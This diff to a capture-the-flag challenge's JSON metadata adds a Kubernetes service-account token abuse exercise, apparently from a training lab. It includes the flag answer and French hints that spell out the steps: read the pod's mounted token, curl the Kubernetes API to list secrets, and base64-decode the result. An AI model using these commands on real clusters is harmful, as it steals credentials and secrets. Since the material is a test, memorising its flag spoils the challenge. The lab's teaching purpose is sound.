@@ -2,5 +2,14 @@
   "name": "Service Account Token Abuse",
   "description": "Exploit a mounted service account token to access the Kubernetes API and retrieve the flag.",
   "category": "container-k8s",
-  "author": "PCE Root Labs"
+  "track": "container-k8s",
+  "module": "4.2",
+  "id": "4.2.4",
+  "author": "PCE Root Labs",
+  "flag": "PCE{k8s_sa_token_abused_2024}",
+  "hints": [
+    "Récupérez le token du service account monté dans le pod : TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+    "Listez les secrets via l'API Kubernetes avec le token : curl -sk -H \"Authorization: Bearer $TOKEN\" https://127.0.0.1:8443/api/v1/namespaces/default/secrets",
+    "La valeur du secret 'flag' est encodée en base64, décodez-la : echo '<valeur_base64>' | base64 -d"
+  ]
 }
